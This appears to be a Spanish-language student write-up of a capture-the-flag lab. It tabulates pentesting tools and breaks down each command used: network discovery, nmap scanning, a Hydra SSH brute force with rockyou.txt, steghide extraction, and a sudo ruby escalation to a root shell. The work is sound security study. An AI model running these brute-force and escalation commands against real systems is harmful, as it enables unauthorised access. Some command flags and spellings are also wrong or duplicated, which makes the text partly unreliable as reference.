1. Realizar una investigación individual de cada una de las herramientas empleadas. Sintetice el resultado mediante un cuadro que explique su definición, funcionalidad y casos de uso.

| **Herramienta** | **Definición** | **Funcionalidad** | **Casos de Uso** |
|------------------|----------------|--------------------|------------------|
| **Docker**       | Plataforma de contenedores para desplegar aplicaciones de forma aislada. | Ejecutar entornos de laboratorio sin alterar el sistema base. | Simulación de entornos vulnerables, pruebas de seguridad. |
| **Nmap**         | Escáner de redes y puertos. | Identifica servicios activos, sistemas operativos y configuraciones. | Pentesting, auditorías de red, inventario de sistemas. |
| **Netdiscover**  | Herramienta ARP para detectar hosts activos. | Descubre dispositivos conectados en la misma red local. | Reconocimiento en redes desconocidas. |
| **Hydra**        | Herramienta para fuerza bruta de credenciales. | Intenta contraseñas sobre servicios como SSH, FTP, HTTP. | Test de resistencia de contraseñas, recuperación de acceso. |
| **SCP**          | Comando para copiar archivos entre sistemas por SSH. | Transfiere archivos de forma segura. | Backup remoto, paso de archivos entre VMs. |
| **Steghide**     | Herramienta de esteganografía. | Oculta y extrae datos en archivos multimedia. | CTFs, protección de información, ocultamiento de datos. |
| **File**         | Identifica el tipo de archivo. | Muestra tipo MIME y codificación. | Análisis forense, clasificación de archivos. |


2. Explicar en detalle cada uno de los comandos empleados en el anterior CTF; realizando un desglose del mismo y citando al menos tres alternativas (si aplica) de variantes del comando para las herramientas empleadas, este punto amplia el ejercicio anterior.

2.1.1  COMANDO: DOCKER PULL RAIOLAB/amor

DESCRIPCION: Descarga la imagen del repositorio

VARIANTES: 
DOKER RUN: Ejecuta el contenero directamente

DOKER IMAGEN: Lista de imagenes descargadas

DOKER RMI: Elimina una imagen

![Herramientas Utilizadas](Image/1.png)

2.2. COMANDO: NETDISCOVER -i eth0 -r 172.17.0.0/16

Descripción: Escaneo ARP para encontrar dispositivos en la red 172.17.0.0/16 usando la interfaz eth0.

•	Variantes:

i wlan0: Usa interfaz WiFi.

o	-r 192.168.1.0/24: Rango de red diferente.

o	-P: Muestra en modo pasivo.

2.3.COMANDO: NMAP -SV -N -V 172.17.0.2

•	Descripción: Escaneo con detección de versiones (-sV), sin resolución DNS (-n) y modo detallado (-v).

•	Variantes:
A: Detección agresiva (SO, scripts).

o	-p: Especifica puertos.

o	-sS: Escaneo SYN stealth.

2.4.COMANDO: HYDRA -L CARLOTA -P /USR/SHARE/WORDLISTS/ROCKYOU.TXT SSH://172.17.0.2 -T 10

•	Descripción: Ataque de fuerza bruta SSH con usuario carlota, usando la lista rockyou.txt, 10 tareas paralelas.

•	Variantes:

	-L: Lista de usuarios.

o	-s: Puerto personalizado.

o	-f: Detener al encontrar contraseña válida.

2.5.5.	COMANDO: SCP carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg .

•	Descripción: Copia el archivo imagen.jpg del servidor remoto a la máquina local.

•	Variantes:

o	scp archivo usuario@ip:/destino: Copia local → remoto.

o	-P: Especificar puerto SSH.

o	-r: Copia recursiva de directorios.

2.6.6.	COMANDO: FILE IMAGEN.JPG

•	Descripción: Muestra tipo de archivo y codificación.

•	Variantes:

o	file -i: Muestra tipo MIME

o	file -i: Muestra tipo MIME

o	file -z: Archivos comprimidos.

2.7. 7.	COMANDO: STEGHIDE EXTRACT -SF IMAGEN.JPG

•	Descripción: Extrae datos ocultos en la imagen imagen.jpg.

•	Variantes:

o	-p [clave]: Especifica contraseña.

o	--force: Extrae sin confirmar sobrescritura.

o	--force: Extrae sin confirmar sobrescritura.

2.8. 8.	COMANDO: ECHO "ZGVZZW5JCNVWDGFKB3JH" | BASE64 -D

•	Descripción: Decodifica cadena Base64.

•	Variantes:

o	base64: Codifica entrada.

o	base64 -w 0: Evita saltos de línea.

o	base64 -w 0: Evita saltos de línea.

2.9. 9.	COMANDO: SUDO /usr/bin/ruby -e 'exec "/bin/bash"'

•	Descripción: Ejecuta Bash desde Ruby como superusuario.

•	Variantes:

o	sudo su: Acceso root directo.

o	sudo -i: Acceso root con entorno de login.

o	sudo ruby script.rb: Ejecuta script Ruby con privilegios.

2.10. 10.	COMANDO: WHOAMI

•	Descripción: Devuelve el usuario actual.

•	Variantes:

o	id: Muestra UID, GID, grupos

o	logname: Usuario del login

o	users: Lista usuarios conectados.



3.    REALICE UN DIAGRAMA DE FLUJO DE TODO EL PROCEDIMIENTO REALIZADO.
  
